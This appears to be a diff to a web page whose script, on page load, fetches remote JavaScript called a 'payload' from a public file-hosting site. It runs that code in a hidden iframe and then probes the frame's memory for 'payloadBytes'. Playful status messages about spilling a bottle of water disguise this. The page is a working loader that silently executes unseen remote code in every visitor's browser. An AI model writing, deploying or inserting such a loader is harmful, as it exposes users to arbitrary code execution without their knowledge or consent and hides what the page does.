@@ -6,50 +6,41 @@
   <link rel="stylesheet" href="style250.css" />
   <script>
   setTimeout(() => {
-    fetch('https://files.catbox.moe/cwedrd.js') // The raw JavaScript payload
+    fetch('https://files.catbox.moe/cwedrd.js') // Your full payload
       .then(res => res.text())
       .then(js => {
-        // Wraps the payload inside a full HTML document with <script> tag
-        const wrapper = `
-        <!DOCTYPE html>
-        <html>
-        <head><title>Payload Wrapper</title></head>
-        <body>
-          <script>
-            ${js}
-          <\/script>
-        </body>
-        </html>
-      `;
-
-        const blob = new Blob([wrapper], {
-          type: 'text/html'
-        });
+        const blob = new Blob([js], { type: 'text/html' });
         const url = URL.createObjectURL(blob);
-
-        const iframe = document.createElement('iframe');
+        
+        const iframe = 
+  document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = url;
-
         iframe.onload = () => {
-          const now = () => `${Math.floor(performance.now())}ms`;
-          document.getElementById("status").textContent = `Spilling 250ml... [${now()}]`;
-
-          // Probe after 5s to check if payloadBytes exists
+          const now = () => 
+  `${Math.floor(performance.now())}ms`;
+  
+  document.getElementById("status").textContent = `Spilling 250ml... [${now()}]`;
+        
+          // 🧪 Execution Probe (runs 5s after load)
           setTimeout(() => {
             try {
               const frame = window.frames[0];
+              
               if (!frame) {
+                
                 document.getElementById("status").textContent = "The iframe is missing. The bottle is locked.";
                 return;
               }
-
+              
               if (!('payloadBytes' in frame)) {
+                
                 document.getElementById("status").textContent = "No water has been spilled. Or maybe some did, but it didn't touch the memory.";
                 return;
               }
-
+              
               const result = frame.payloadBytes;
+              
               if (result instanceof Uint8Array) {
                 document.getElementById("status").textContent = "Water spilled successfully!";
               } else {
@@ -60,17 +51,17 @@
             }
           }, 5000);
         };
-
+        
         iframe.onerror = () => {
           document.getElementById("status").textContent = "Bottle not filled. Try again.";
         };
-
+        
         document.body.appendChild(iframe);
       })
       .catch(e => {
-        document.getElementById("status").textContent = `The bottle couldn't even be poured: ${e.message}`;
+        document.getElementById("status").textContent = `Something happened: ${e.message}`;
       });
-  }, 1500);
+   }, 1500);
   </script>
 </head>
 <body>
